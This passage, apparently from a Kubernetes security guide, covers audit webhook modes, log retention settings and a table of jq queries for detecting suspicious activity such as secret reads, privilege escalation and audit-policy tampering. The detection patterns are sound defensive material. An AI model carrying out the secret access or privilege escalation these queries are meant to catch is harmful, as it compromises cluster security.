• Trade: may lose events under extreme load
blocking (sync)
--audit-webhook-mode=blocking

• Each API request WAITS for webhook
• API latency = webhook latency
• If webhook is DOWN → API BLOCKED 🔴
• NO events lost (guaranteed delivery)
• RECOMMENDED for compliance (PCI-DSS)
• Trade: webhook outage = cluster outage

Log Rotation and Retention — Production Best Practices

ParameterRecommended ValueWhy
--audit-log-maxsize100 (MB)Small enough to rotate frequently, large enough to avoid excessive rotations
--audit-log-maxbackup10-30Retain enough history for incident investigation (10-30 days of logs)
--audit-log-maxage30 (days)Matches SOC 2 and PCI-DSS retention requirements (30-90 days typical)
Disk space estimate~1-5 GB/dayDepends on cluster activity; budget accordingly for log volume
External shippingWebhook to SIEMOff-node storage protects logs even if node is compromised

28.5 Detecting Suspicious Activity from Audit Logs

Raw audit logs produce thousands of events per minute. Security monitoring means identifying the signal in the noise — the patterns that indicate an active attack or policy violation.

Suspicious Audit Log Patterns — Red Flags with Detection Queries

🛡️ Red FlagWhat It Looks Likejq Detection
Secret Access by Unexpected UserNon-system SA reading secretsselect(.objectRef.resource=="secrets")
Privilege EscalationCreating ClusterRoleBindingsselect(.objectRef.resource=="clusterrolebindings")
Unexpected Pod Execkubectl exec by non-admin usersselect(.objectRef.subresource=="exec")
HostNetwork/Privileged PodPod with dangerous specs createdselect(.verb=="create" and .objectRef.resource=="pods") + inspect requestObject
High Rate of Failed AuthMultiple 401/403 in short windowselect(.responseStatus.code>=400) + time window aggregation
Namespace-Crossing AccessSA accessing resources outside its namespaceselect(.user.username != .objectRef.namespace) (SA pattern)
Webhook/Admission ChangesModifying ValidatingWebhookConfigurationselect(.objectRef.resource=="validatingwebhookconfigurations")
Audit Policy TamperingModifying API server manifest or audit policyMonitor file access to /etc/kubernetes/manifests/ and /etc/kubernetes/audit-policy.yaml
